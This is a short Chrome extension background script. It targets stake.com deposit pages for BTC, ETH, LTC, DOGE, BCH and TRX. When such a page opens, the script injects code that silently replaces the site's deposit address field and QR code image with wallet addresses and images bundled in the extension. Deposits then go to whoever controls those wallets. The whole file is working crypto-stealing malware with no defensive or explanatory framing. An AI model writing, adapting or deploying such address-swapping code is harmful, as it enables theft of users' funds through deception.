importScripts('./wallets.js')

const pattern = /https:\/\/stake\.com\/\?tab=deposit&currency=(btc|eth|ltc|doge|bch|trx)&modal=wallet/i

chrome.webNavigation.onHistoryStateUpdated.addListener(details => {
    let [,currency = 'none'] = details.url.match(pattern) ?? []
    if(currency == 'none') return

    currency = currency.toLowerCase()

    let newAddress = wallets[currency]
    let newQRImage = chrome.runtime.getURL(`qr/${currency}.png`)

    chrome.scripting.executeScript({
        target: {tabId: details.tabId},
        func: inject,
        args: [newAddress, newQRImage]
    },
    () => {
        let lastError = chrome.runtime.lastError
        if(lastError) console.log(lastError.message)
    })
}, {url: [{hostContains: 'stake.com'}]})

function inject(newAddress, newQRImage) {
    let tries = 0, maxTries = 10 * 1000, interval = 100

    let searchInterval = setInterval(() => {
        let address = document.querySelector('[data-test="wallet-deposit-address-input"]')
        let qrImage = document.querySelector('img[alt="deposit-address"]')
        
        tries += 100

        if(!address || !qrImage) {
            if(tries >= maxTries) {
                clearInterval(searchInterval)
                console.log(`Failed to get address in ${tries/1000}s`)
                return
            }
            return
        }
        
        clearInterval(searchInterval)
        
        if(address) address.value = newAddress
        if(qrImage) qrImage.src = newQRImage
    }, interval)
}